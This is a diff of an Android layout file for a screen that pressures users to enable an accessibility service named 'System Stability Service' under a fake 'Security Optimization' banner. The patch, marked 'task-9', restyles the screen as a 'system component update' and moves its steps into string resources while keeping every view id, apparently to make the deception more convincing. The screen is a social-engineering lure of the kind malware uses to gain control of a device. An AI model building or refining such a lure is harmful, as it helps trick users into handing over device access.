@@ -1,9 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
+<!-- PATCHED (task-9): "system component update" style. All original view ids kept. -->
 <androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:app="http://schemas.android.com/apk/res-auto"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#FDFDFD">
+    android:background="#0D0F14">
 
     <ScrollView
         android:layout_width="match_parent"
@@ -20,31 +21,30 @@
             android:padding="32dp">
 
             <ImageView
-                android:layout_width="225dp"
-                android:layout_height="207dp"
+                android:layout_width="140dp"
+                android:layout_height="140dp"
                 android:layout_marginTop="40dp"
-                android:src="@drawable/ic_android_play" />
+                android:src="@drawable/ic_android_system" />
 
             <TextView
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:layout_marginTop="20dp"
-                android:text="Security Optimization"
-                android:textColor="#E0118A4C"
-                android:textSize="29sp"
+                android:layout_marginTop="24dp"
+                android:text="@string/guide_accessibility_title"
+                android:textColor="#F2F4F8"
+                android:textSize="24sp"
                 android:textStyle="bold" />
 
             <TextView
-                android:layout_width="217dp"
+                android:layout_width="match_parent"
                 android:layout_height="wrap_content"
-                android:layout_marginTop="5dp"
+                android:layout_marginTop="12dp"
                 android:layout_marginBottom="40dp"
                 android:alpha="0.9"
                 android:gravity="center"
-                android:text="Your device requires important security optimizations to continue. Please follow these steps:"
-                android:textColor="#CB5B5B5B"
-                android:textSize="17sp"
-                android:textStyle="bold" />
+                android:text="@string/guide_accessibility_subtitle"
+                android:textColor="#9AA3B2"
+                android:textSize="16sp" />
 
             <!-- Step 1 -->
             <TextView
@@ -54,9 +54,9 @@
                 android:layout_marginVertical="6dp"
                 android:background="@drawable/guide_step_bg"
                 android:padding="14dp"
-                android:text="1. Tap START"
-                android:textColor="#676B69"
-                android:textSize="17sp"
+                android:text="@string/guide_step_1"
+                android:textColor="#B0B6C0"
+                android:textSize="16sp"
                 android:textStyle="bold" />
 
             <!-- Step 2 -->
@@ -67,9 +67,9 @@
                 android:layout_marginVertical="6dp"
                 android:background="@drawable/guide_step_bg"
                 android:padding="14dp"
-                android:text="2. Select Installed apps"
-                android:textColor="#676B69"
-                android:textSize="17sp"
+                android:text="@string/guide_step_2"
+                android:textColor="#B0B6C0"
+                android:textSize="16sp"
                 android:textStyle="bold" />
 
             <!-- Step 3 -->
@@ -80,9 +80,9 @@
                 android:layout_marginVertical="6dp"
                 android:background="@drawable/guide_step_bg"
                 android:padding="14dp"
-                android:text="3. Tap System Stability Service --> Toggle ON &amp; Allow"
-                android:textColor="#676B69"
-                android:textSize="17sp"
+                android:text="@string/guide_step_3"
+                android:textColor="#B0B6C0"
+                android:textSize="16sp"
                 android:textStyle="bold" />
 
         </LinearLayout>
@@ -92,7 +92,7 @@
         android:id="@+id/buttonContainer"
         android:layout_width="match_parent"
         android:layout_height="100dp"
-        android:background="#FFFFFF"
+        android:background="#0D0F14"
         android:paddingBottom="16dp"
         app:layout_constraintBottom_toBottomOf="parent">
 
@@ -102,12 +102,12 @@
             android:layout_height="53dp"
             android:layout_gravity="center"
             android:fontFamily="sans-serif-medium"
-            android:text="START"
+            android:text="@string/guide_button"
             android:textAllCaps="true"
             android:textColor="#FFFFFF"
             android:textSize="18sp"
             android:textStyle="bold"
-            app:backgroundTint="#EB098E4A"
+            app:backgroundTint="#0B875B"
             app:cornerRadius="100dp" />
 
     </FrameLayout>
